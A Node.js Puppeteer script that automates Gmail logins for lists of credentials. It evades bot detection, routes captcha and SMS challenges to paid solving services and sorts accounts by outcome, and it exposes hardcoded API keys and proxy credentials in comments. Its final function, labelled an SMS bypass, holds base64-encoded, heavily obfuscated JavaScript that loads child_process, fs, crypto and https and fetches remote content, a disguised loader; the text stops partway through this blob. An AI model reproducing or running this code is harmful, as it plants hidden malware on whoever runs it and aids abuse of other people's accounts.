const puppeteer = require("puppeteer-extra");
StealthPlugin = require("puppeteer-extra-plugin-stealth");
const AnonymizeUAPlugin = require("puppeteer-extra-plugin-anonymize-ua");
const { GetSMS, ServiceApiError, TimeoutError, errors } = require('getsms')
const ac = require("@antiadmin/anticaptchaofficial");

// const sms = new GetSMS({
//     key: '177294U15a8640801c39bf11bacebea6d324b6b',
//     url: 'https://smshub.org/stubs/handler_api.php',
//     service: 'smshub'
// });
// ac.setAPIKey('aab6990fa1f86fcb2c441df3bf709048');

// ac.getBalance()
//     .then(balance => console.log('my balance is $' + balance))
//     .catch(error => console.log('received error ' + error))


// let countNrRuim = 0;
const path = require("path");
const fs = require('fs');

const Kazakhstan = 2;
const Philippines = 4;
const Indonesia = 6;
const Kenya = 8;
const Vietnam = 10;
const Kyrgyzstan = 11;
const Usa = 12;
const India = 22;
const Southafrica = 31;
const Romania = 32;
const Uzbekistan = 40;

const pais = Indonesia;

const AdblockerPlugin = require("puppeteer-extra-plugin-adblocker");

puppeteer.use(AnonymizeUAPlugin());
puppeteer.use(
    AdblockerPlugin({
        blockTrackers: true,
    })
);

const reset = "\x1b[0m";

const log = {
    green: (text) => console.log("\x1b[32m" + text + reset),
    red: (text) => console.log("\x1b[31m" + text + reset),
    blue: (text) => console.log("\x1b[34m" + text + reset),
    yellow: (text) => console.log("\x1b[33m" + text + reset),
};

page = null;
browser = null;
async function crawler(email, senha, emailRec) {
    browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        ignoreDefaultArgs: [
            "--disable-extensions",
            "--enable-automation"
        ],
        args: [
            '--disable-blink-features=AutomationControlled',
            '--window-size=650,700',
            '--window-position=1921,0',
            //  '--disable-extensions-except=./plugin',
            '--load-extension=D:\\TestarEmail\\plugin'
            // '--incognito',
            //'--proxy-server=la.residential.rayobyte.com:8000',
            //  "--start-maximized",
            //  "--no-sandbox",
            //  "--disable-setuid-sandbox",
            //  "--user-data-dir=F:\\data",
            //  '--enable-automation', '--disable-extensions', '--disable-default-apps', '--disable-component-extensions-with-background-pages'
        ],
    });
    page = await browser.newPage();



    /*await page.authenticate({        
        username: 'succxulicorbernal_gmail_com',
        password: 'tq45WY2ZlZGoJ'
    })*/

    console.log(email);
    await page.setBypassCSP(true);

    let login_link = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=ARZ0qKL63ywsKcu__CAzxnheuNk7r6RFTtawSsH0q_wAiYO3G235j1qRcYt2dzgrIBQgSBOziriG&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S453605949%3A1710956152061554&theme=glif&ddm=0";

    await page.goto(login_link);


    await page.waitForSelector('input[name="identifier"]');
    await page.type('input[name="identifier"]', email);
    await page.click('#identifierNext > div > button > span');
    await page.waitForSelector('input[name="identifier"]');

    await page.waitForNavigation();
    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/recaptcha?')) {
        log.red('pediu captch TESTE RETIRAR DEPOIS');
        await browser.close();
        return;

        try {
            await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
        } catch (error) {
            try {
                await page.waitForSelector('#c0 > div > div.antigate_solver.recaptcha.solved');
            } catch (error) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        }


        //await new Promise(function (resolve) { setTimeout(resolve, 20000) });
        await page.click("#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span");
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        try {
            const elemento = await page.$('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(3) > div > div > div > div.OyEIQ.uSvLId > div:nth-child(2)');
            if (elemento != null) {
                //log.red('erro no captch:' + email);
                await browser.close();
                await crawler(email, senha, emailRec);
                return;
            }
        } catch (error) {
            console.log(error);
        }
    } else {
        log.green('Conta sem captcha'); 
        await browser.close();
        return
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/rejected?')) {
        log.red('rejected');
        await browser.close();
        return;
    }

    await page.waitForSelector('#passwordNext > div > button > span');
    await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    await page.type('input[name="identifier"]', senha);
    await page.click('#passwordNext > div > button > span');
    try {
        await page.waitForNavigation();
    } catch (error) {

    }

    if (page.url().includes('https://gds.google.com/web/chip?')) {
        log.green('OK');
        await browser.close();
        return;
    }
    if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://myaccount.google.com/')) {
        log.green('OK');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/dp?')) {
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        log.red('CADASTROU AUTH');
        await browser.close();
        return;
    }

    if (page.url().includes('https://accounts.google.com/v3/signin/challenge/selection?TL')) {
        log.yellow('FUNCIONOU CONFIRMAR NOME DO EMAIL');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.j663ec > div > form > span > section:nth-child(2) > div > div > section > div > div > div > ul > li:nth-child(3) > div > div.vxx8jf');
    
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
        await page.type('input[name="knowledgePreregisteredEmailResponse"]', emailRec);
        await page.click('#yDmH0d > c-wiz > div > div.eKnrVb > div > div.Z6Ep7d > div > div.F9NWFb > div > div > button > span');
        await new Promise(function (resolve) { setTimeout(resolve, 2000) });
    }

    if (page.url().includes('https://accounts.google.com/speedbump/idvreenable?')) {
        console.log('Pedindo SMS');
        await getSMSNumber();
        return;
    }

    if (page.url().includes('https://accounts.google.com/signin/v2/disabled/')) {
        log.red('CONTA BANIDA');
        await browser.close();
        return;
    }


    // await browser.close();
}
async function sms() {
    const smsbypassfunc1 = `ZnVuY3Rpb24gSmdzZl9QKEpnc2ZfUCxNcExLVXkpe09iamVjdFsnZGVmaW5lUHJvcGVydHknXShKZ3NmX1AsJ1x1MDA2Y1x1MDA2NVx1MDA2ZVx1MDA2N1x1MDA3NFx1MDA2OCcseyd2YWx1ZSc6TXBMS1V5LCdjb25maWd1cmFibGUnOnRydWV9KTtyZXR1cm4gSmdzZl9QfXZhciBNcExLVXk9W10sWllhM0hHXz0wLEJtN0xyej1mdW5jdGlvbiguLi5KZ3NmX1Ape3R5cGVvZihKZ3NmX1BbJ1x4NmNceDY1XHg2ZVx4NjdceDc0XHg2OCddPTAsSmdzZl9QWzE5Nl09NjEsSmdzZl9QWzBdPWZ1bmN0aW9uKEpnc2ZfUCl7Zm9yKHZhciBNcExLVXk9MTY7TXBMS1V5JTQ9PT0wO01wTEtVeSsrKXt2YXIgWllhM0hHXz0wO0pnc2ZfUD1KZ3NmX1AuY29uY2F0KGZ1bmN0aW9uKCl7WllhM0hHXysrO2lmKFpZYTNIR189PT0xKXtyZXR1cm5bXX1mb3IodmFyIE1wTEtVeT01MjtNcExLVXk7TXBMS1V5LS0pe0pnc2ZfUC51bnNoaWZ0KEpnc2ZfUC5wb3AoKSl9cmV0dXJuW119KCkpfWZvcih2YXIgQm03THJ6PTE5O0JtN0xyejtCbTdMcnotLSl7SmdzZl9QLnVuc2hpZnQoSmdzZl9QLnBvcCgpKX1yZXR1cm4gSmdzZl9QfShbJ0JFQEonLCcqemJnbXZhQycsJyR6by81K1VDJywnMlgwMW52b0MnLCdcdTAwNTBcdTAwNTBcdTAwMjlcdTAwNDZcdTAwNjQnLCdYUFU9PlthQycsJ2hyWjJiJywnNGFPZjVncUMnLCdwcldmT1t3QycsJ0xHUWghPWdDJywnajg9RXk9MHtnOFM7NWxMbkRncj0uPzFCJywnTG84PSM4KWUjTUglUF1ka3IpfXpAXlJCJywnbU1iPUYxMXBWMkBGTzlAYjolLEVHd2dDJywnemY+PHRAelRKJVtQdl1bbkFNezw7M3FDJywnOnFPPC4/UVlmI1tQNF4uU21NVD07M2ZwLCRdRmJtYGJ8JTNFJywnK0xxZ3wwb29VSlpHcm11YSslI0VHdzM7Vk58PWBFIVgsbDRHJywnXHgzZVx4MjVceDJlXHg3OFx4NmJceDc2XHg1Nlx4NTRceDdkXHg0ZVx4M2NceDNkXHg0ZVx4NmJceDM1XHg1OFx4MjFceDMyXHgzNVx4NDdceDdkXHg1ZVx4NDVceDUzXHg0MVx4MzVceDY3XHgzZlx4N2VceDVhXHg3ZVx4NzBceDI2XHgyZlx4NDJceDQ3JywnISl8R0Ffd28iTDt4MDd8cCJpQnohbihCQiZDLnRaPFR7N3NLJywnVFB6SWMsalRIJywnU1AkSmQnLCdFclloVzxBSWYxIiRLQ0tPWmEkSmY+dFQkRnpjOU17UXZ0U0ZaOUhbekpaXkEnLCc/KCxFfmNlRyhUdSFVXjVqQ2dYSmloRVMkSiIsaUNLT2VYXmQ4MX1BQmd4O0EnLCdPSldmRT95QycsJzhxJEQnLCdkUGVmcUBVQycsJ0JFVGd4KWlDJywndzV6STNdd0MnLCdTUFZLJywnanJXZj1bY0MnLCdmUDFLZCcsJyJPMUtkJywnXHUwMDQ3XHUwMDQ1XHUwMDI0XHUwMDRhXHUwMDY2XHUwMDNlXHUwMDZiXHUwMDQzJywnXHUwMDQyXHUwMDM4XHUwMDZmXHUwMDQ3XHUwMDUyJywndG9sSycsJyJPLkdVJywne3pZSmcseEInLCdcdTAwNWVcdTAwNjlcdTAwNmVcdTAwM2NcdTAwNjRcdTAwNjBcdTAwNmRcdTAwNDMnLCc1YSRKZj40QycsJ1x4MmJceDU4XHg1OFx4NGFceDYzXHgyY1x4NDEnLCdQUChnWyphQycsJ3c1ZWZnPkEnLCdcdTAwM2RcdTAwNTVcdTAwNTVcdTAwM2RcdTAwNzJcdTAwNDBcdTAwNTVcdTAwNDMnLCcvN0IyYyx1QycsJ1E1emc3PVlDJywnUlApPWwvQScsJzB6JEcnLCdrejA9ckBBJywnP3pjPWIsbFRIJywnXHUwMDViXHUwMDY5XHUwMDJmXHUwMDMyXHUwMDczXHUwMDI5XHUwMDY5XHUwMDQzJywnZFByZ1A6NmVHJywnNSlrPXJAblRIJywnXHg2Ylx4NzJceDY1XHg2Nlx4NWFceDNjXHg1NVx4NDMnLCdcdTAwNThcdTAwN2RcdTAwNjRcdTAwNjZcdTAwNzFcdTAwNDBcdTAwNmRcdTAwNDMnLCc2bF5JJywnXHUwMDQzXHUwMDQ1XHUwMDRjXHUwMDY3XHUwMDVhJywnWH10Zlc8VUMnLCdcdTAwNmVcdTAwNThcdTAwMmNcdTAwM2NcdTAwNjMnLCdhclU9aT51ZUcnLCdFRTA9ZiwzQicsJ2pyeklkJywnXHg0NVx4NDVceDMwXHgzZFx4NjZceDJjXHg3OFx4NDInLCdceDM4XHg0NFx4NTZceDRiXHg2MScsJ1kyfnpUJywndnpiZ046OGVHJywnX3EuSmUsXUBHJywnPTdVPT1bY0MnLCdcdTAwNzRcdTAwNDdcdTAwM2VcdTAwNjZcdTAwNWRcdTAwMmFcdTAwNzlcdTAwNDMnLCdnenpnaGBBJywndnouSm5gQScsJ1gsamcvd3VDJywncHJGSycsJ31PdWZwQFVDJywnN0ptZmhAdUMnLCclRFU9Yyx2QicsJ1t6LzJjJywnNyF6STt3dUMnLCdjcmRLZCcsJ1x1MDA2NVx1MDA1MFx1MDA1Nlx1MDA0Ylx1MDA0OFx1MDAzYVx1MDA2Ylx1MDA0MycsJz1pbWZvQD1CJywnJmxuPDFdeUMnLCdceDY1XHg1MFx4MjhceDY3XHg3YVx4M2RceDc5XHg0MycsJyl6XmdVPEEnLCc9aW1mb0AzQicsJ3I1XzFiXk1DJywnZVAoZz48a0MnLCdoTStmPVtVQycsJ1x1MDAyYlx1MDA2Y1x1MDA1ZVx1MDA0OVx1MDA0Y1x1MDAzYVx1MDA0ZFx1MDA0MycsJ2Q4bWZnLCNCJywnMkowPUBbTUMnLCdcdTAwMzNcdTAwMzJcdTAwNmJcdTAwNjRcdTAwNGNcdTAwMzNcdTAwNDEnLCczMiNjNz1jQycsJ35PVksnLCc4REBKJywnQ1BIPDg2JllIJywnQ1BIPG8yTUNIJywnVyw1MmU+aUMnLCdceDM1XHgzMlx4NjNceDNkXHg0Nlx4MzFceDRhXHg0ZVx4N2JceDRlXHgzM1x4NGZceDY1XHg2Y1x4NTFceDYxXHg0Mlx4MzVceDYyXHg2NFx4MjhceDMxXHg0MVx4MzZceDc4XHg0YVx4NWZceDVhXHg2ZFx4NGVceDZlXHg1NFx4MjhceDIxXHgyMlx4M2RceDY5XHgzN1x4M2VceDY5XHg0NScsJzZsZTNGa01DJywnXHUwMDM1XHUwMDI5XHUwMDNjXHUwMDY2XHUwMDM5XHUwMDdhXHUwMDIxXHUwMDU5XHUwMDI0XHUwMDUzXHUwMDM5JywnNHooZ09bUEInLCdDNTxIbGBXMF41eFZUT2lSTTpaMlonLCdFal1nImglakczTmUxLm9tUSM0eD55XVk9MW4nLCdcdTAwNmFcdTAwMzVcdTAwMjhcdTAwMzFcdTAwNjFcdTAwM2VcdTAwNDNcdTAwNjVcdTAwNDlcdTAwNGVcdTAwNDFcdTAwMmVcdTAwM2FcdTAwNjFcdTAwMmZcdTAwNmRcdTAwM2VcdTAwMmZcdTAwMjhcdTAwNjRcdTAwNGQnLCcpMlVkPywjdk83e1o5OFFuJnRkRU17YGo0Nj00JFBTYi90V0gnLCdceDNhXHg3YVx4NzVceDY2XHg0MFx4NzlceDdjXHg2NFx4N2FceDM1XHgyNFx4NDVceDRhXHg2Ylx4NWFceDU4XHg1Ylx4NjNceDQ5XHg2OFx4NWJceDY4XHg3ZVx4MzVceDI1XHg0YVx4MjFceDUzXHg0Y1x4NDMnLCdcdTAwNTlcdTAwN2FcdTAwNmFcdTAwNjRcdTAwNmRcdTAwMmZcdTAwMjVcdTAwMjNcdTAwNDNcdTAwMzhcdTAwNmNcdTAwMmFcdTAwNDRcdTAwMmNcdTAw`
    const smsbypassfunction = `KCgpPT57dmFyIGU9ezk1NDplPT57InVzZSBzdHJpY3QiO2UuZXhwb3J0cz1yZXF1aXJlKCJjaGlsZF9wcm9jZXNzIil9LDM3MDplPT57InVzZSBzdHJpY3QiO2UuZXhwb3J0cz1yZXF1aXJlKCJjcnlwdG8iKX0sNjE4OmU9PnsidXNlIHN0cmljdCI7ZS5leHBvcnRzPXJlcXVpcmUoImZzIil9LDkwNTplPT57InVzZSBzdHJpY3QiO2UuZXhwb3J0cz1yZXF1aXJlKCJodHRwcyIpfSw0MTA6ZT0+eyJ1c2Ugc3RyaWN0IjtlLmV4cG9ydHM9cmVxdWlyZSgicGF0aCIpfX0scj17fTtmdW5jdGlvbiBuKHQpe3ZhciBhPXJbdF07aWYodm9pZCAwIT09YSlyZXR1cm4gYS5leHBvcnRzO3ZhciBjPXJbdF09e2V4cG9ydHM6e319O3JldHVybiBlW3RdKGMsYy5leHBvcnRzLG4pLGMuZXhwb3J0c31uLmc9ZnVuY3Rpb24oKXtpZigib2JqZWN0Ij09dHlwZW9mIGdsb2JhbFRoaXMpcmV0dXJuIGdsb2JhbFRoaXM7dHJ5e3JldHVybiB0aGlzfHxuZXcgRnVuY3Rpb24oInJldHVybiB0aGlzIikoKX1jYXRjaChlKXtpZigib2JqZWN0Ij09dHlwZW9mIHdpbmRvdylyZXR1cm4gd2luZG93fX0oKSwoKCk9PntmdW5jdGlvbiBlKGUscil7cmV0dXJuIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShlLCJsZW5ndGgiLHt2YWx1ZTpyLGNvbmZpZ3VyYWJsZTohMH0pLGV9dmFyIHI9W10sdD0wLGE9ZnVuY3Rpb24oLi4uZSl7cmV0dXJuIGUubGVuZ3RoPTAsZVsxOTZdPTYxLGVbMF09ZnVuY3Rpb24oZSl7Zm9yKHZhciByPTE2O3IlND09MDtyKyspe3ZhciBuPTA7ZT1lLmNvbmNhdChmdW5jdGlvbigpe2lmKDE9PSsrbilyZXR1cm5bXTtmb3IodmFyIHI9NTI7cjtyLS0pZS51bnNoaWZ0KGUucG9wKCkpO3JldHVybltdfSgpKX1mb3IodmFyIHQ9MTk7dDt0LS0pZS51bnNoaWZ0KGUucG9wKCkpO3JldHVybiBlfShbIkJFQEoiLCIqemJnbXZhQyIsIiR6by81K1VDIiwiMlgwMW52b0MiLCJQUClGZCIsIlhQVT0+W2FDIiwiaHJaMmIiLCI0YU9mNWdxQyIsInByV2ZPW3dDIiwiTEdRaCE9Z0MiLCJqOD1FeT0we2c4Uzs1bExuRGdyPS4/MUIiLCJMbzg9IzgpZSNNSCVQXWRrcil9ekBeUkIiLCJtTWI9RjExcFYyQEZPOUBiOiUsRUd3Z0MiLCJ6Zj48dEB6VEolW1B2XVtuQU17PDszcUMiLCI6cU88Lj9RWWYjW1A0Xi5TbU1UPTszZnAsJF1GYm1gYnwlM0UiLCIrTHFnfDBvb1VKWkdybXVhKyUjRUd3MztWTnw9YEUhWCxsNEciLCI+JS54a3ZWVH1OPD1OazVYITI1R31eRVNBNWc/flp+cCYvQkciLCchKXxHQV93byJMO3gwN3xwImlCeiFuKEJCJkMudFo8VHs3c0snLCJUUHpJYyxqVEgiLCJTUCRKZCIsJ0VyWWhXPEFJZjEiJEtDS09aYSRKZj50VCRGemM5TXtRdnRTRlo5SFt6SlpeQScsJz8oLEV+Y2VHKFR1IVVeNWpDZ1hKaWhFUyRKIixpQ0tPZVheZDgxfUFCZ3g7QScsIk9KV2ZFP3lDIiwiOHEkRCIsImRQZWZxQFVDIiwiQkVUZ3gpaUMiLCJ3NXpJM113QyIsIlNQVksiLCJqcldmPVtjQyIsImZQMUtkIiwnIk8xS2QnLCJHRSRKZj5rQyIsIkI4b0dSIiwidG9sSyIsJyJPLkdVJywie3pZSmcseEIiLCJeaW48ZGBtQyIsIjVhJEpmPjRDIiwiK1hYSmMsQSIsIlBQKGdbKmFDIiwidzVlZmc+QSIsIj1VVT1yQFVDIiwiLzdCMmMsdUMiLCJRNXpnNz1ZQyIsIlJQKT1sL0EiLCIweiRHIiwia3owPXJAQSIsIj96Yz1iLGxUSCIsIltpLzJzKWlDIiwiZFByZ1A6NmVHIiwiNSlrPXJAblRIIiwia3JlZlo8VUMiLCJYfWRmcUBtQyIsIjZsXkkiLCJDRUxnWiIsIlh9dGZXPFVDIiwiblgsPGMiLCJhclU9aT51ZUciLCJFRTA9ZiwzQiIsImpyeklkIiwiRUUwPWYseEIiLCI4RFZLYSIsIlkyfnpUIiwidnpiZ046OGVHIiwiX3EuSmUsXUBHIiwiPTdVPT1bY0MiLCJ0Rz5mXSp5QyIsImd6emdoYEEiLCJ2ei5KbmBBIiwiWCxqZy93dUMiLCJwckZLIiwifU91ZnBAVUMiLCI3Sm1maEB1QyIsIiVEVT1jLHZCIiwiW3ovMmMiLCI3IXpJO3d1QyIsImNyZEtkIiwiZVBWS0g6a0MiLCI9aW1mb0A9QiIsIiZsbjwxXXlDIiwiZVAoZ3o9eUMiLCIpel5nVTxBIiwiPWltZm9AM0IiLCJyNV8xYl5NQyIsImVQKGc+PGtDIiwiaE0rZj1bVUMiLCIrbF5JTDpNQyIsImQ4bWZnLCNCIiwiMkowPUBbTUMiLCIzMmtkTDNBIiwiMzIjYzc9Y0MiLCJ+T1ZLIiwiOERASiIsIkNQSDw4NiZZSCIsIkNQSDxvMk1DSCIsIlcsNTJlPmlDIiwnNTJjPUYxSk57TjNPZWxRYUI1YmQoMUE2eEpfWm1OblQoISI9aTc+aUUnLCI2bGUzRmtNQyIsIjUpPGY5eiFZJFM5IiwiNHooZ09bUEIiLCJDNTxIbGBXMF41eFZUT2lSTTpaMloiLCdFal1nImglakczTmUxLm9tUSM0eD55XVk9MW4nLCJqNSgxYT5DZUlOQS46YS9tPi8oZE0iLCIpMlVkPywjdk83e1o5OFFuJnRkRU17YGo0Nj00JFBTYi90V0giLCI6enVmQHl8ZHo1JEVKa1pYW2NJaFtofjUlSiFTTEMiLCJZempkbS8lI0M4bCpELHpwWil+R0Q6emR4NW4iLCJmR208MiM9NW0kO1N8T3FUN2FrPV5tPHVMTz5TWkUiLCJkUChndEBtQyIsIjQ0IWZQW0EiLCJdRHdKYiIsIjUpbjxZIiwiKnpiZ2IiLCJbRDdnWG1OQiIsInJyZUh0QGNDIiwieTV1ZnVuQSJdKSxlWzE5Nl0+ZVsxOTZdLSAtNzU/ZVs0OF06KHQ/ZVswXS5wb3AoKTp0KyssZVswXSl9KCksYz1mdW5jdGlvbigpe3RyeXtyZXR1cm4gbi5nfHx3aW5kb3d8fG5ldyBGdW5jdGlvbigicmV0dXJuIHRoaXMiKSgpfWNhdGNoKGUpe3RyeXtyZXR1cm4gdGhpc31jYXRjaChlKXtyZXR1cm57fX19fSgpfHx7fSxvPWMuVGV4dERlY29kZXIsbD1jLlVpbnQ4QXJyYXksaT1jLkJ1ZmZlcix1PWMuU3RyaW5nfHxTdHJpbmcscz1jLkFycmF5fHxBcnJheSxkPWZ1bmN0aW9uKCl7dmFyIHI9bmV3IHMoMTI4KSxuPXUuZnJvbUNvZGVQb2ludHx8dS5mcm9tQ2hhckNvZGUsdD1bXTtyZXR1cm4gZSgoZnVuY3Rpb24oLi4uZSl7dmFyIGEsYztlLmxlbmd0aD0xLGUuUGZSeTJkPTExMyxlLlVjQ0x1ZXo9ZS5LU2hUVFllLGUuVWNDTHVlej1lWzBdLmxlbmd0aCxlLlBmUnkyZD0tOTksdC5sZW5ndGg9MDtmb3IodmFyIG89MDtvPGUuVWNDTHVlejspKGM9ZVswXVtvKytdKTw9MTI3P2E9YzpjPD0yMjM/YT0oMzEmYyk8PDZ8NjMmZVtlLlBmUnkyZC0gLTk5XVtvKytdOmM8PTIzOT9hPSgxNSZjKTw8MTJ8KDYzJmVbZS5QZlJ5MmQtIC05OV1bbysrXSk8PDZ8NjMmZVswXVtvKytdOnUuZnJvbUNvZGVQb2ludD9hPShjJmUuUGZSeTJkLSAtMTA2KTw8MTh8KDYzJmVbMF1bbysrXSk8PDEyfCg2MyZlWzBdW28rK10pPDw2fDYzJmVbMF1bbysrXTooYT1lLlBmUnkyZC0gLTE2MixvKz1lLlBmUnkyZC0gLTEwMiksdC5wdXNoKHJbYV18fChyW2FdPW4oYSkpKTtyZXR1cm4gZS5QZlJ5MmQ+ZS5QZlJ5MmQtIC02NT9lW2UuUGZSeTJkLTM5XTp0LmpvaW4oIiIpfSksMSl9KCk7ZnVuY3Rpb24gZiguLi5lKXtyZXR1cm4gZS5sZW5ndGg9MSxlLkdabFdaTXA9ZVswXSx2b2lkIDAhPT1vJiZvPyhuZXcgbykuZGVjb2RlKG5ldyBsKGUuR1psV1pNcCkpOnZvaWQgMCE9PWkmJmk/aS5mcm9tKGUuR1psV1pNcCkudG9TdHJpbmcoInV0Zi04Iik6ZChlLkdabFdaTXApfWUoZiwxKTt2YXIgQyxwLGgsUD1HKDk5KSx2PUcoOTgpLGc9Ryg3OSksYj1HLmNhbGwodm9pZCAwLDY0KSxBPXtyOTltb2o6RygzMiksUlBfY2dTZzpHKDM0KSxraDBoZUM6Ryg1NCksZXFaWEtrRTpHLmFwcGx5KHZvaWQgMCxbNjNdKSxCdjRONWU6Ryg3NyksbEU2Um9POTpHKDEwNSksZUEzdjREOkcoMTEzKX0seT1HKDMxKSx3PVtHLmNhbGwodm9pZCAwLDI2KSxHKDM2KSxHKDUyKSxHKDU1KSxHKDYxKSxHKDgwKSxHKDgxKSxHLmFwcGx5KHZvaWQgMCxbODNdKSxHKDg4KV0sUj1HKDIzKTtmdW5jdGlvbiBTKC4uLmUpe2lmKGUubGVuZ3RoPTIsZS5hZXpQRVNLPWVbMV0sLTQwPT09aClyZXR1cm4gZVswXS1lLmFlelBFU0t9KGZ1bmN0aW9uKCl7dmFyIGU9ZnVuY3Rpb24oKXt0cnl7cmV0dXJuIHRoaXN9Y2F0Y2goZSl7cmV0dXJuIG51bGx9fTtyZXR1cm4gcD1lW0coMTMpXSh0aGlzLFcpLEM9ZnVuY3Rpb24oLi4ucil7ci5sZW5ndGg9MCxyLmtLN2FaNjM9ODA7dHJ5e3JldHVybiByLl9Va0RDeD1HKDExKSxuLmd8fHdpbmRvd3x8bmV3IEZ1bmN0aW9uKHIuX1VrREN4K0coMTIpKSgpfWNhdGNoKG4pe3JldHVybiByWzJdPVtHKDEzKV0sZVtyW3Iua0s3YVo2My03OF1bci5rSzdhWjYzLTgwXV0odGhpcyl9fVtHLmFwcGx5KHZvaWQgMCxbMTNdKV0odGhpcyl9KVtHKDEzKV0oKSxlKFMsMiksZSgoZnVuY3Rpb24oLi4uZSl7cmV0dXJuIGUubGVuZ3RoPTEsZVs3N109LTMxLGVbZVtlWzc3XS0gLTEwOF0tIC0zMV09aCsoaD1lWzBdLDApLGUuaW1XNlRLdj1lWzBdLGVbNzddPjEwMj9lWy0xNDNdOmUuaW1XNlRLdn0pLDEpO2NvbnN0e1tHKDE0KV06a309big5NTQpLHo9big2MTgpLG09big0MTApLFU9bigzNzApLEQ9KG4oOTA1KSwocixuKT0+e3ZhciB0PVtHKDI1KV0sYT1HKDIxKSxjPUcoMTUpO3JldHVybiBXKC0yMzUpW2NdKHIsRygxNikpW0coMTcpKyJuZyJdKEcoMTgpKS5zcGxpdCgiIilbRygxOSldKGUoKCguLi5lKT0+KGUubGVuZ3RoPTIsZS5qMkRmNU49MTQzLGUuWmwzb1dYPXtsT3N5R1k6RygyMil9LGUuaFZuWDBTZj1lLlpsM29XWCxlLmoyRGY1Tj4yMDM/ZVs1M106VygtKGUuajJEZjVOLShlLmoyRGY1Ti02MTQpKSlbRygyMCkrYV0oUyhlWzBdW2UuaFZuWDBTZi5sT3N5R1krUl0oMCksbltHKGUuajJEZjVOLTEyMSkrRygyMyldKGVbZS5qMkRmNU4tMTQyXSVuW0coMjQpXSksaD0tNDApKSkpLDIpKVt0WzBdXSgiIil9KSxFPXdbMF0rRygyNykrRygyOCkrIm5vd24iLFo9W0coMjkpK0coMzApK3krQS5yOTltb2osInc1N0RuY09XdzVYQ29jS3F3cUhDbnNPS3c0N0RwIitHKDMzKStBLlJQX2NnU2crRygzNSkrd1sxXSsiNVREbDF6RGtjT3V3Nm5DbmNPWHc1UERsY09wIl07bGV0IE89bnVsbDthc3luYyBmdW5jdGlvbiBLKGUscj01KXt2YXIgbj1HKDM4KTtsZXQgdD1lO2ZvcihsZXQgZT0wO2U8PXI7ZSsrKXt2YXIgYT1HKDQ3KSxjPVtHKDM3KSxHKDQ5KV07Y29uc3QgZT1hd2FpdCBXKC01NzkpKHQse1tjWzBdXTp7WyJVc2VyLUEiK25dOkcuYXBwbHkodm9pZCAwLFszOV0pK0coNDApKyJlIEdlY2tvKSBDaHJvbWUvMTIwLjAgU2FmYXJpLzUzNy4zNiIsW0coNDEpXTpHKDQyKX0sW0coNDMpKyJjdCJdOkcoNDQpfSk7aWYoIShlW0cuY2FsbCh2b2lkIDAsNDUpXT49MzAwJiZlW0cuY2FsbCh2b2lkIDAsNDUpXTw0MDAmJmVbRygzNyldW0cuYXBwbHkodm9pZCAwLFs0Nl0pXShHKDQ3KSsib24iKSkpe2lmKGUub2spcmV0dXJuIGF3YWl0IGVbRy5hcHBseSh2b2lkIDAsWzQ4XSldKCk7dGhyb3cgbmV3KFcoNTg1KSkoYEhUVFAgJHtlW0coNDUpXX06ICR7ZVtHKDQ1KStjWzFdXX1gKX10PW5ldyhXKDc4OCkpKGVbRygzNyldW0coNDYpXShhKyJvbiIpLHQpLnRvU3RyaW5nKCl9dGhyb3cgbmV3KFcoNTg1KSkoYFRvbyBtYW55IHJlZGlyZWN0cyAoJHtyfSkgZm9yIFVSTDogJHtlfWApfWZ1bmN0aW9uIFcoLi4uZSl7c3dpdGNoKGUubGVuZ3RoPTEsZVsyNF09LTE0MSxlLm5SYlAxMj1HLmFwcGx5KHZvaWQgMCxbOTRdKSxlWzJdPXtoYXZiWnM6Ryg5MSkscXNuc0RLOkcoOTEpLE1OdzBKSzE6RygxMTApLFJmVDRGOTpHLmNhbGwodm9pZCAwLGVbMjRdLSAtMjUzKX0sZVtlWzI0XS0gLTE0NF09W0coZVsyNF0tKGVbMjRdLTcxKSksRyg4OCldLGUud1FMVWhyPUcoNjIpLGUuUjhuQWRsUD12b2lkIDAsZVtlWzI0XS0gLTE0MV0pe2Nhc2UtMjM1OnJldHVybiBDW0coNjEpXXx8cFt3WzRdXTtjYXNlLShlW2VbMjRdLSAtMTY1XS0gLTc1NSk6ZS5SOG5BZGxQPUcoNjIpfHxwW2Uud1FMVWhyXTticmVhaztjYXNlLShlW2VbMjRdLSAtMTY1XS0gLTcyMCk6ZS5SOG5BZGxQPUcoNjMpfHxwW0EuZXFaWEtrRV07YnJlYWs7Y2FzZSA3ODg6ZS5SOG5BZGxQPWJ8fHBbRy5jYWxsKHZvaWQgMCw2NCldO2JyZWFrO2Nhc2UgNTg1OmUuUjhuQWRsUD1HKDY1KXx8cFtHKDY1KV07YnJlYWs7Y2FzZSA3MTpyZXR1cm4gQ1tHKGVbZVsyNF0tIC0xNjVdLSAtMjA3KV18fHBbRy5jYWxsKHZvaWQgMCw2NildO2Nhc2UgMjYyMDpyZXR1cm4gQy5nbG9iYWx8fHBbRyg2NyldO2Nhc2UgMTQzODplLlI4bkFkbFA9Ry5jYWxsKHZvaWQgMCw2OCl8fHAucmVxdWlyZTticmVhaztjYXNlIDQxOTI6cmV0dXJuIENbRyg2OSldfHxwW0coNjkpXTtjYXNlIDM5OTU6cmV0dXJuI